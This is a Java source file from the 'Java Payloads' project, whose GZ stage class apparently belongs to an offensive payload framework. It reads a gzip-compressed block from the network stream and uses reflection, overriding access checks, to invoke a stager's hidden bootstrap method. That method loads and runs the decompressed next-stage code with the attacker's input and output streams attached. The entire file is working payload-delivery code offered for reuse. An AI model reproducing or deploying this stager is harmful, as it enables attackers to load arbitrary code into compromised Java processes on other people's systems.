/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.io.SequenceInputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

public class GZ {
	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		byte[] compressed = new byte[in.readInt()];
		in.readFully(compressed);
		String[] newParams = (String[])parameters.clone();		
		for (int i = 0;; i++) {
			if (parameters[i].equals("--")) {
				newParams[i] = "bootstrap";
				newParams[i+1] = "--";
				Object stager = getClass().getClassLoader();
				SequenceInputStream gzin = new SequenceInputStream(new GZIPInputStream(new ByteArrayInputStream(compressed)), in);
				Class[] clazz = new Class[] {
						Class.forName("java.io.InputStream"),
						Class.forName("java.io.OutputStream"),
						Class.forName("[Ljava.lang.String;")
				};
				Class stagerClass = stager.getClass();
				while (true) {
					try {
						Method m = stagerClass.getDeclaredMethod("bootstrap", clazz);
						m.setAccessible(true);
						m.invoke(stager, new Object[] { gzin, out, newParams });
						break;
					} catch (Exception ex) {
						stagerClass = stagerClass.getSuperclass();
					}
				}
				break;
			}
		}
	}
}
